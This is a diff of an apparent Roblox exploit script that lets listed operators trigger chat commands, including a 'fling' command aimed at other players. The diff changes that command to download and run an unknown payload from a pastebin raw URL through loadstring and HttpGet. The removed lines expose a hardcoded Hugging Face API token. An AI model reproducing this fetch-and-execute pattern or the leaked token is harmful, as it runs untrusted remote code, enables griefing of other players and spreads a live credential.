@@ -5,7 +5,11 @@ local HttpService = game:GetService("HttpService")
 
 local lPlayer = Players.LocalPlayer
 
-local Ops = {[4089251764] = true}
+local Ops = {
+	[4089251764] = true,
+	[2786732327] = true
+}
+
 local skipping = false
 
 local function GetRoot()
@@ -22,19 +26,14 @@ end
 local function GetPlayer(query)
 	if not query or query == "" then return nil end
 	query = query:lower()
-	local matches = {}
 	for _, player in ipairs(Players:GetPlayers()) do
-		if player.Name:lower():find(query, 1, true) or player.DisplayName:lower():find(query, 1, true) then
-			table.insert(matches, player)
+		if player.Name:lower():find(query, 1, true)
+			or player.DisplayName:lower():find(query, 1, true) then
+			return player
 		end
-	end
-	if #matches == 1 then
-		return matches[1]
 	end
 	return nil
 end
-
-
 
 local function Op(speaker, raw)
 	if not Ops[speaker.UserId] then return end
@@ -131,9 +130,9 @@ local function Fling(speaker, raw)
 
 	local targetPlayer = GetPlayer(targetRaw)
 	if targetPlayer then
-		getgenv().Target = targetPlayer
 		print(targetPlayer)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/1shibainu/Kaboom/refs/heads/main/skidfling"))()
+		getgenv().Target = targetPlayer
+		loadstring(game:HttpGet("https://pastebin.com/raw/VdNCSDTD"))()
 	end
 end
 
@@ -173,76 +172,6 @@ local function Ver(speaker, raw)
 
 	TextChatService.TextChannels.RBXGeneral:SendAsync("7")
 end
-
-local HF_TOKEN = "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"
-
-local MODEL = "HuggingFaceH4/starchat-beta"
-local ENDPOINT = "https://api-inference.huggingface.co/models/" .. MODEL
-
-
-local function GetAi(prompt)
-	local payload = HttpService:JSONEncode({
-		inputs = prompt,
-		parameters = {
-			max_new_tokens = 80,
-			temperature = 0.7
-		}
-	})
-
-	local headers = {
-		["Authorization"] = "Bearer " .. HF_TOKEN,
-		["Content-Type"] = "application/json"
-	}
-
-	local success, response = pcall(function()
-		return HttpService:RequestAsync({
-			Url = ENDPOINT,
-			Method = "POST",
-			Headers = headers,
-			Body = payload
-		})
-	end)
-
-	if not success then
-		return "Request failed: " .. tostring(response)
-	end
-
-	if response.StatusCode ~= 200 then
-		return "Request failed: " .. tostring(response.StatusCode)
-	end
-
-	local ok, decoded = pcall(function()
-		return HttpService:JSONDecode(response.Body)
-	end)
-
-	if not ok then
-		return "Decode failed: " .. tostring(response.Body)
-	end
-
-	if decoded and decoded.generated_text then
-		return decoded.generated_text
-	end
-
-	if decoded and decoded[1] and decoded[1].generated_text then
-		return decoded[1].generated_text
-	end
-
-	return "No response text found."
-end
-
-local function Geremy(speaker, raw)
-	if not Ops[speaker.UserId] then return end
-
-	local textRaw = raw:sub(8)
-	if textRaw == "" then return end
-
-	local reply = GetAi(textRaw)
-
-	TextChatService.TextChannels.RBXGeneral:SendAsync("[Geremy] " .. reply)
-
-	print("[Geremy Output] " .. reply)
-end
-
 
 local function PlayerChatted(speaker, message)
 	if message == "/stop" then
@@ -286,11 +215,6 @@ local function PlayerChatted(speaker, message)
 		Say(speaker, message)
 		return
 	end
-	if message:sub(1,7) == "geremy " then
-		Geremy(speaker, message)
-		return
-	end
-	
 end
 
 local function Loader(player)
